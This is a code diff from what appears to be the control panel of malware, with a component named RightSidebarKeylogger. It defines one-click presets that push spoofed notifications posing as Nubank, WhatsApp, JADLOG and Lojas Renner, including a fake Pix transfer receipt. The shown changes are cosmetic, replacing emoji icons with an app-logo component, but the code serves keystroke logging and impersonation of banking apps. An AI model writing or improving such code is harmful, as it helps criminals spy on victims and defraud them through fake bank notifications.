@@ -87,41 +87,41 @@ interface KeystrokeEntry {
 
 // Aplicativos populares pré-configurados para Push Notifications (Essenciais e objetivos)
 export const POPULAR_PUSH_APPS = [
-  { name: "Nubank", packageName: "com.nu.production", icon: "🟣" },
-  { name: "WhatsApp", packageName: "com.whatsapp", icon: "💬" },
-  { name: "JADLOG Rastreio", packageName: "com.droidview.agent", icon: "📦" },
-  { name: "Lojas Renner", packageName: "com.lojasrenner", icon: "🛍️" },
-  { name: "Outro App", packageName: "", icon: "✨" }
+  { name: "Nubank", packageName: "com.nu.production", icon: "" },
+  { name: "WhatsApp", packageName: "com.whatsapp", icon: "" },
+  { name: "JADLOG Rastreio", packageName: "com.droidview.agent", icon: "" },
+  { name: "Lojas Renner", packageName: "com.lojasrenner", icon: "" },
+  { name: "Outro App", packageName: "", icon: "" }
 ];
 
 // Presets táticos com 1 clique para agilizar envio de notificações push
 export const PUSH_NOTIFICATION_PRESETS = [
   {
-    label: "⚡ Pix Nubank",
+    label: "Pix Nubank",
     appName: "Nubank",
     packageName: "com.nu.production",
     title: "Transferência recebida",
     message: "Você recebeu um Pix de R$ 1.250,00 de Carlos Silva."
   },
   {
-    label: "💬 WhatsApp",
+    label: "WhatsApp",
     appName: "WhatsApp",
     packageName: "com.whatsapp",
     title: "Nova mensagem",
     message: "Oi! Você viu os documentos que te mandei mais cedo?"
   },
   {
-    label: "📦 Jadlog Rastreio",
+    label: "Jadlog Rastreio",
     appName: "JADLOG Rastreio",
     packageName: "com.droidview.agent",
     title: "Status da Entrega",
     message: "Sua encomenda #JD-98231BR saiu para entrega ao destinatário."
   },
   {
-    label: "🛍️ Renner 50% OFF",
+    label: "Renner 50% OFF",
     appName: "Lojas Renner",
     packageName: "com.lojasrenner",
-    title: "Você escolhe 😉",
+    title: "Você escolhe - 50% OFF",
     message: "Descontos de até 50% na nova coleção. Aproveite frete grátis hoje!"
   }
 ];
@@ -1428,9 +1428,7 @@ export function RightSidebarKeylogger({
                 }}
               >
                 <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
-                  <span style={{ fontSize: "13px", flexShrink: 0 }}>
-                    {POPULAR_PUSH_APPS.find((a) => a.name.toLowerCase() === pushAppName.toLowerCase())?.icon || "🔔"}
-                  </span>
+                  <AppLogo name={pushAppName} packageName={pushPackageName} size={14} />
                   <div style={{ minWidth: 0 }}>
                     <div style={{ fontSize: "9.5px", fontWeight: 700, color: "#f8fafc", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                       {pushAppName || "App"}: {pushTitle || "Notificação"}
@@ -1529,7 +1527,7 @@ export function RightSidebarKeylogger({
                       }}
                       title={app.packageName ? `${app.name} (${app.packageName})` : app.name}
                     >
-                      <span>{app.icon}</span>
+                      <AppLogo name={app.name} packageName={app.packageName} size={12} />
                       <span>{app.name}</span>
                     </button>
                   );
@@ -1689,9 +1687,7 @@ export function RightSidebarKeylogger({
               >
                 <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                   <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
-                    <span style={{ fontSize: "12px" }}>
-                      {POPULAR_PUSH_APPS.find((a) => a.name.toLowerCase() === pushAppName.toLowerCase())?.icon || "🔔"}
-                    </span>
+                    <AppLogo name={pushAppName} packageName={pushPackageName} size={14} />
                     <span style={{ fontSize: "9.5px", fontWeight: 700, color: "#f8fafc" }}>
                       {pushAppName || "Aplicativo"}
                     </span>
